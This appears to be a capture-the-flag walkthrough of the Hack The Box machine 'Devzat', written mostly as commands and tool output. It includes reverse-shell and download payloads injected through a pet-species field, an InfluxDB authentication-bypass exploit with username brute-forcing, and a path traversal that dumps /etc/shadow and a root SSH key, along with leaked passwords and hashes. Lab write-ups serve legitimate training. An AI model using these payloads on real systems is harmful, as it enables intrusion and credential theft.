# scanning
* `TCP` Scan
TARGET=10.10.11.118 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

## 22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

## 80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://devzat.htb/

> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://devzat.htb/" -H "Host: FUZZ.devzat.htb" --hl 107
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000003745:   200        20 L     35 W       510 Ch      "pets"

* has an interface to add pets, may be vuln to cmd injection


> dirsearch -u http://devzat.htb/ -x 302
[08:29:25] 200 -   17KB - /LICENSE.txt
[08:29:25] 200 -  877B  - /README.txt
[08:29:33] 301 -  309B  - /assets  ->  http://devzat.htb/assets/
[08:29:33] 200 -    1KB - /assets/
[08:29:41] 301 -  309B  - /images  ->  http://devzat.htb/images/
[08:29:41] 200 -    2KB - /images/
[08:29:42] 200 -    6KB - /index.html
[08:29:42] 301 -  313B  - /javascript  ->  http://devzat.htb/javascript/

> dirsearch -u http://pets.devzat.htb/ -x 302,403
[08:50:31] 404 -   19B  - /.git/refs/remotes/origin/master
[08:50:46] 404 -   19B  - /build/build.properties
[08:50:46] 200 -   81B  - /build/
[08:50:46] 404 -   19B  - /build/reference/web-api/explore
[08:50:46] 404 -   19B  - /build/buildinfo.properties
[08:50:46] 404 -   19B  - /build/Release
[08:50:48] 301 -   40B  - /css  ->  /css/

> python3 ~/tools/git-dumper/git_dumper.py http://pets.devzat.htb/ src
```go
func loadCharacter(species string) string {
	cmd := exec.Command("sh", "-c", "cat characteristics/"+species)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error()
	}
	return string(stdoutStderr)
}
```
* add pet interface species param is vuln to command injection
```
{"name":"testset","species":"dog|wget http://10.10.x.x/nc"}
{"name":"testset","species":"dog|chmod +x nc"}
{"name":"testset","species":"dog|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|./nc 10.10.x.x 4444 >/tmp/f"}
```

## 8000/tcp open  ssh     syn-ack ttl 63 (protocol 2.0)
| ssh-hostkey: 
|   3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-Go

> ssh -l [username] devzat.htb -p 8000


# pe
* get patrick id_rsa and login through ssh
* run peas
```
[+] HTTP sockets
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
Socket /run/user/1000/snapd-session-agent.socket owned by patrick uses HTTP. Response to /index:
{"type":"error","result":{"message":"method \"GET\" not allowed"}}
Socket /run/snapd.socket owned by root uses HTTP. Response to /index:
{"type":"sync","status-code":200,"status":"OK","result":["TBD"]}
Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index:
{"type":"error","status-code":403,"status":"Forbidden","result":{"message":"access denied","kind":"login-required"}}

[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      842/./petshop       
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      840/./devchat 

Possible private SSH keys were found!
/home/patrick/go/pkg/mod/golang.org/x/crypto@v0.0.0-20210513164829-c07d793c2f9a/ssh/testdata/keys.go
/home/patrick/go/pkg/mod/golang.org/x/crypto@v0.0.0-20210513164829-c07d793c2f9a/acme/jws_test.go
/home/patrick/go/pkg/mod/golang.org/x/crypto@v0.0.0-20210513164829-c07d793c2f9a/openpgp/read_test.go
/home/patrick/go/pkg/mod/golang.org/x/crypto@v0.0.0-20210513164829-c07d793c2f9a/openpgp/clearsign/clearsign_test.go
/home/patrick/.ssh/id_rsa
/home/patrick/pets/static/node_modules/livereload/test/ssl/localhost.key

[+] Checking if containerd(ctr) is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
ctr was found in /usr/bin/ctr, you may be able to escalate privileges with it
ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

[+] Checking if runc is available
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
runc was found in /usr/bin/runc, you may be able to escalate privileges with it

Files with capabilities (limited to 50):
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

/home/catherine/.bash_history
```

> ssh -L 18443:127.0.0.1:8443 -L 18086:127.0.0.1:8086 -L 15000:127.0.0.1:5000 patrick@10.10.11.118 -i id_rsa_patrick
> dirsearch -u http://127.0.0.1:18086/
[09:41:20] 200 -   10KB - /debug/pprof/goroutine?debug=1
[09:41:20] 200 -   18KB - /debug/pprof/heap
[09:41:20] 200 -    2KB - /debug/pprof
[09:41:26] 200 -    5KB - /metrics
[09:41:29] 204 -    0B  - /ping
[09:41:32] 204 -    0B  - /status
[09:41:32] 204 -    0B  - /status?full=true


> nmap -p18086 127.0.0.1 -sV -vvv
PORT      STATE SERVICE REASON         VERSION
18086/tcp open  http    syn-ack ttl 64 InfluxDB http admin 1.7.5

https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933

> root@kali:~/workspace/htb-Devzat/InfluxDB-Exploit-CVE-2019-20933# python3 __main__.py 
```
  _____        __ _            _____  ____    ______            _       _ _   
 |_   _|      / _| |          |  __ \|  _ \  |  ____|          | |     (_) |  
   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ 
   | | | '_ \|  _| | | | \ \/ / |  | |  _ <  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ 
 |_____|_| |_|_| |_|\__,_/_/\_\_____/|____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                                         | |                  
                                                         |_|                  
CVE-2019-20933

Insert ip host (default localhost): 
Insert port (default 8086): 18086
Insert influxdb user (wordlist path to bruteforce username): /usr/share/wordlists/SecLists/Usernames/Names/names.txt

Start username bruteforce
[x] aaliyah
[x] aaren
[x] aarika
[x] aaron
[x] aartjan
[x] aarushi
[x] abagael
[x] abagail
[x] abahri
[x] abbas
[x] abbe
[x] abbey
[x] abbi
[x] abbie
[x] abby
[x] abbye
[x] abdalla
[x] abdallah
[x] abdul
[x] abdullah
[x] abe
[x] abel
[x] abi
[x] abia
[x] abigael
[x] abigail
[x] abigale
[x] abra
[x] abraham
[x] abram
[x] abree
[x] abrianna
[x] abriel
[x] abrielle
[x] abu
[x] aby
[x] acacia
[x] access
[x] accounting
[x] ace
[x] achal
[x] achamma
[x] action
[x] ada
[x] adah
[x] adair
[x] adalia
[x] adaline
[x] adalyn
[x] adam
[x] adan
[x] adara
[x] adda
[x] addi
[x] addia
[x] addie
[x] addilyn
[x] addison
[x] addons
[x] addy
[x] ade
[x] adel
[x] adela
[x] adelaida
[x] adelaide
[x] adele
[x] adelene
[x] adelheid
[x] adelia
[x] adelice
[x] adelina
[x] adelind
[x] adeline
[x] adella
[x] adelle
[x] adelynn
[x] aden
[x] adena
[x] adeniyi
[x] adey
[x] adi
[x] adiana
[x] adie
[x] adina
[x] aditya
[v] admin

Host vulnerable !!!
Databases list:

1) devzat
2) _internal

Insert database name (exit to close): devzat
[devzat] Insert query (exit to change db): select * from users;
{
    "error": "error parsing query: found USERS, expected identifier at line 1, char 15"
}
[devzat] Insert query (exit to change db): select * from user
{
    "error": "error parsing query: found USER, expected identifier at line 1, char 15"
}
[devzat] Insert query (exit to change db): select * from "user"
{
    "results": [
        {
            "series": [
                {
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "name": "user",
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ],
            "statement_id": 0
        }
    ]
}
```
catherine:woBeeYareedahc7Oogeephies7Aiseci

patrick@devzat:~/devzat$ su catherine
Password: 
catherine@devzat:~$ ls -la
total 32
drwxr-xr-x 4 catherine catherine 4096 Sep 21 19:35 .
drwxr-xr-x 4 root      root      4096 Jun 22  2021 ..
lrwxrwxrwx 1 root      root         9 Jun 22  2021 .bash_history -> /dev/null
-rw-r--r-- 1 catherine catherine  220 Jun 22  2021 .bash_logout
-rw-r--r-- 1 catherine catherine 3808 Jun 22  2021 .bashrc
drwx------ 2 catherine catherine 4096 Sep 21 19:35 .cache
-rw-r--r-- 1 catherine catherine  807 Jun 22  2021 .profile
drwx------ 2 catherine catherine 4096 Sep 29 16:31 .ssh
-r-------- 1 catherine catherine   33 Jan  6 05:30 user.txt
catherine@devzat:~$ cat user.txt 


# pe
`CeilingCatStillAThingIn2021?`
> catherine@devzat:/var/backups$ unzip devzat-dev.zip -d /tmp/
Archive:  devzat-dev.zip
   creating: /tmp/dev/
  inflating: /tmp/dev/go.mod         
 extracting: /tmp/dev/.gitignore     
  inflating: /tmp/dev/util.go        
  inflating: /tmp/dev/testfile.txt   
  inflating: /tmp/dev/eastereggs.go  
  inflating: /tmp/dev/README.md      
  inflating: /tmp/dev/games.go       
  inflating: /tmp/dev/colors.go      
 extracting: /tmp/dev/log.txt        
  inflating: /tmp/dev/commands.go    
  inflating: /tmp/dev/start.sh       
  inflating: /tmp/dev/devchat.go     
  inflating: /tmp/dev/LICENSE        
  inflating: /tmp/dev/commandhandler.go  
  inflating: /tmp/dev/art.txt        
  inflating: /tmp/dev/go.sum         
 extracting: /tmp/dev/allusers.json  

```go
func fileCommand(u *user, args []string) {
	if len(args) < 1 {
		u.system("Please provide file to print and the password")
		return
	}

	if len(args) < 2 {
		u.system("You need to provide the correct password to use this function")
		return
	}

	path := args[0]
	pass := args[1]

	// Check my secure password
	if pass != "CeilingCatStillAThingIn2021?" {
		u.system("You did provide the wrong password")
		return
	}

	// Get CWD
	cwd, err := os.Getwd()
	if err != nil {
		u.system(err.Error())
	}

	// Construct path to print
	printPath := filepath.Join(cwd, path)

	// Check if file exists
	if _, err := os.Stat(printPath); err == nil {
		// exists, print
		file, err := os.Open(printPath)
		if err != nil {
			u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			u.system(scanner.Text())
		}

		if err := scanner.Err(); err != nil {
			u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))
		}

		return

	} else if os.IsNotExist(err) {
		// does not exist, print error
		u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
		return
	}
	// bokred?
	u.system("Something went badly wrong.")
}
```

> admin: /file ../..//etc/shadow CeilingCatStillAThingIn2021?
[SYSTEM] root:$6$DKdyL4hqyhhxcRyc$8N.1K/dHPqLb7VSB0IvfB.uhIKsH7IeGP/iyTRSYImFiAawsaUOKs/TWe0DCp5wSscYvi.XjX8JPe6lZNnEmH/:18891:0:99999:7:::
[SYSTEM] daemon:*:18659:0:99999:7:::
[SYSTEM] bin:*:18659:0:99999:7:::
[SYSTEM] sys:*:18659:0:99999:7:::
[SYSTEM] sync:*:18659:0:99999:7:::
[SYSTEM] games:*:18659:0:99999:7:::
[SYSTEM] man:*:18659:0:99999:7:::
[SYSTEM] lp:*:18659:0:99999:7:::
[SYSTEM] mail:*:18659:0:99999:7:::
[SYSTEM] news:*:18659:0:99999:7:::
[SYSTEM] uucp:*:18659:0:99999:7:::
[SYSTEM] proxy:*:18659:0:99999:7:::
[SYSTEM] www-data:*:18659:0:99999:7:::
[SYSTEM] backup:*:18659:0:99999:7:::
[SYSTEM] list:*:18659:0:99999:7:::
[SYSTEM] irc:*:18659:0:99999:7:::
[SYSTEM] gnats:*:18659:0:99999:7:::
[SYSTEM] nobody:*:18659:0:99999:7:::
[SYSTEM] systemd-network:*:18659:0:99999:7:::
[SYSTEM] systemd-resolve:*:18659:0:99999:7:::
[SYSTEM] systemd-timesync:*:18659:0:99999:7:::
[SYSTEM] messagebus:*:18659:0:99999:7:::
[SYSTEM] syslog:*:18659:0:99999:7:::
[SYSTEM] _apt:*:18659:0:99999:7:::
[SYSTEM] tss:*:18659:0:99999:7:::
[SYSTEM] uuidd:*:18659:0:99999:7:::
[SYSTEM] tcpdump:*:18659:0:99999:7:::
[SYSTEM] landscape:*:18659:0:99999:7:::
[SYSTEM] pollinate:*:18659:0:99999:7:::
[SYSTEM] sshd:*:18800:0:99999:7:::
[SYSTEM] systemd-coredump:!!:18800::::::
[SYSTEM] patrick:$6$7ni9PM4l99B7EKPi$/uLBm1IhrKmkS9xPaIgRRZj8aVfASc4eIZt.FvNDEz2r06MIsQMEf3bNegOIxGI./UsabjqsRSV6hWxrJrqbj0:18800:0:99999:7:::
[SYSTEM] catherine:$6$.T9ZmexDFzOpXCH/$u9TICZ3NN5HOC1lWNHGuXP0Hyn/R8HMPS12kUgFdPAwUNl8F3qd5yuL6ptmW40IrBLxBMOTjskHfu1CwK72bw0:18800:0:99999:7:::
[SYSTEM] usbmux:*:18800:0:99999:7:::

> john --wordlist=/usr/share/wordlists/rockyou.txt unshadow

admin: /file ../..//root/root.txt CeilingCatStillAThingIn2021?
[SYSTEM] ``

* to get root
admin: /file ../..//root/.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
[SYSTEM] HAAAAAtzc2gtZWQyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqA
[SYSTEM] AAAECtFKzlEg5E6446RxdDKxslb4Cmd2fsqfPPOffYNOP20d+v8nnFgciadUghCpQomz7s
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----

# ref
https://medium.com/@bhaideepak675/devzat-hackthebox-write-up-devzat-hackthebox-walkthrough-6e8fb5d3a8ad